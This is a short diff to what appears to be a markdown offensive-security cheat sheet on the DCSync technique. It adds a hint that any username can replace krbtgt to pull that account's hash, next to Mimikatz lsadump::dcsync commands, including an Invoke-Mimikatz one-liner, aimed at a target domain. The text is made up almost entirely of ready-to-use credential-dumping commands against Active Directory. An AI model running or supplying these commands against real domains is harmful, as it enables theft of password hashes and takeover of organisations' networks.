@@ -99,6 +99,10 @@ lsadump::dcsync /domain:target.domain.com /user:prod\krbtgt
 
 ## DSync
 
+{% hint style="info" %}
+Replace /user:Domain\krbtgt by any username to get a specific hash
+{% endhint %}
+
 ```csharp
  Invoke-Mimikatz -Command '"lsadump::dcsync /user:Domain\krbtgt"'
 ```
